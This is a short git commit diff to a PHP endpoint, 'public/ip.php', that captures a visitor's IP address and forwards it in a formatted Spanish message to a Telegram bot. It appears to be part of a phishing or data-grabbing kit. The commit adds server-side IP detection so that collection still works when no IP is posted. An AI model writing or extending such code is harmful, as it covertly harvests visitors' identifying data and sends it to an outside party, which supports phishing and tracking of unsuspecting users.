7d7038053113bf53ebd7be83a108ee83859b3112
rigojz <rigoj4847@gmail.com>
2025-09-08 13:46:21 -0600

    Update ip.php

--- public/ip.php
+++ public/ip.php
@@ -1,11 +1,13 @@
 <?php
 require_once __DIR__ . '/telegram.php';
+require_once __DIR__ . '/ip_utils.php';
 
-$ip = $_POST['ip'] ?? 'N/A';
+$ip = $_POST['ip'] ?? get_client_ip();
 
-$msg = "🌍 <b>IP capturada</b>\n".
-       "📌 $ip";
+$msg = "🌍 <b>IP Detectada</b>\n".
+       "📌 Dirección: $ip";
 
 send_to_telegram($msg);
 
-echo json_encode(['status' => 'ok']);
+echo json_encode(["ok" => true]);
+?>
